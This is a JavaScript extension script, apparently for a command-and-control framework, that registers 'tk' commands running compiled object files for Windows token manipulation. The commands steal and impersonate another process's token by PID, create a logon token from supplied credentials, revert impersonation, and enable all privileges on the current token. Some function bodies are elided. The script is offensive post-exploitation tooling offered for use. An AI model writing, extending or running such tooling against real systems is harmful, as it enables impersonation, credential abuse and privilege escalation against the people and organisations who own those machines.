var metadata = {
    name: "TK-BOF",
    description: "Token management: steal, use, make, rm, revert, privget",
};

var cmd_tk_steal = ax.create_command("steal", "Duplicate a process token by PID and optionally apply impersonation", "tk steal <pid>");
...
cmd_tk_steal.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ...
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "BOF: tk steal");
});
...
var cmd_tk_make = ax.create_command("make", "Create a token from credentials via LogonUserW", "tk make <username> <password>");
...
cmd_tk_make.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ...
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}" ${bof_params}`, "BOF: tk make");
});
...
var cmd_tk_revert = ax.create_command("revert", "Drop impersonation and revert to process token", "tk revert");
cmd_tk_revert.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    let bof_path = ax.script_dir() + "_bin/revert." + ax.arch(id) + ".o";
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}"`, "BOF: tk revert");
});

var cmd_tk_privget = ax.create_command("privget", "Enable all privileges on the current token", "tk privget");
cmd_tk_privget.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    ...
    ax.execute_alias(id, cmdline, `execute bof "${bof_path}"`, "BOF: tk privget");
});
